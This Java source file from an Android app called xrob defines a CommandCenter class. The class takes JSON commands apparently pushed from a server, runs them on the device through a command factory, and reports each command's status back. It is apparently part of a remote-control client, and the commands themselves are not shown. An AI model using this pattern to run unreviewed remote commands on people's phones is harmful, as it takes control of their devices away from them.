package com.theah64.xrob.commandcenter;

import android.content.Context;

import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
import com.theah64.xrob.commandcenter.commands.BaseCommand;
import com.theah64.xrob.database.CommandStatuses;
import com.theah64.xrob.models.Command;
import com.theah64.xrob.utils.APIRequestGateway;

import org.acra.ACRA;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by theapache64 on 14/9/16.
 */
public class CommandCenter {

    private static final String KEY_ID = "id";
    private static final String KEY_COMMAND = "command";

    public static void handle(final Context context, final String typeData) {

        System.out.println("Command center gonna handle : " + typeData);

        try {
            final JSONObject joCommandData = new JSONObject(typeData);

            final String commandId = joCommandData.getString(KEY_ID);
            final String command = joCommandData.getString(KEY_COMMAND);
            final CommandStatuses commandStatusesTable = CommandStatuses.getInstance(context);

            commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_DELIVERED, "Command delivered : " + command));

            try {
                final BaseCommand theCommand = CommandFactory.getCommand(new Command(commandId, command));
                theCommand.handle(context);
                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FINISHED, "Command finished handling"));

            } catch (BaseCommand.CommandException e) {
                e.printStackTrace();
                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED, "Error : " + e.getMessage()));
                ACRA.getErrorReporter().handleException(e);
            } finally {
                new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                    @Override
                    public void onReadyToRequest(String apiKey) {
                        new CommandStatusesSynchronizer(context).execute(apiKey);
                    }

                    @Override
                    public void onFailed(String reason) {

                    }
                });
            }

        } catch (JSONException e) {
            e.printStackTrace();
            ACRA.getErrorReporter().handleException(e);
        }
    }
}
